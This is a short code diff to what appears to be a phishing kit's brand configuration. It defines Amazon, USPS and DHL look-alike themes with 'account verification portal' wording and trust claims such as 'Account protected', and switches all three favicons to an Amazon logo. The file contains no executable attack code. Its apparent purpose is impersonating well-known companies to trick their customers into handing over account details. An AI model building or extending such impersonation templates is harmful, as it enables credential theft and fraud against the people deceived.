@@ -36,7 +36,7 @@ const AMAZON_BRAND: BrandConfig = {
   tagline: 'Orders. Delivery. Account security.',
   legal: 'Amazon account and order verification portal.',
   promises: ['Secure session', 'Account protected', 'Customer support'],
-  favicon: '/favicon.svg?v=brand-6',
+  favicon: '/favicons/amazon.png?v=brand-8',
   theme: {
     navy: '#1c2836',
     panel: '#243244',
@@ -65,7 +65,7 @@ const USPS_BRAND: BrandConfig = {
   tagline: 'Track. Verify. Deliver.',
   legal: 'Amazon account and order verification portal.',
   promises: ['Domestic route checks', 'Recipient identity checks', '24/7 support'],
-  favicon: '/favicon.svg?v=brand-6',
+  favicon: '/favicons/amazon.png?v=brand-8',
   theme: {
     navy: '#11284c',
     panel: '#17386a',
@@ -94,7 +94,7 @@ const DHL_BRAND: BrandConfig = {
   tagline: 'Reliable. Secure. Confirmed.',
   legal: 'Amazon account and order verification portal.',
   promises: ['Route protection', 'Identity checks', 'Around-the-clock support'],
-  favicon: '/favicon.svg?v=brand-6',
+  favicon: '/favicons/amazon.png?v=brand-8',
   theme: {
     navy: '#7b0015',
     panel: '#b2041f',
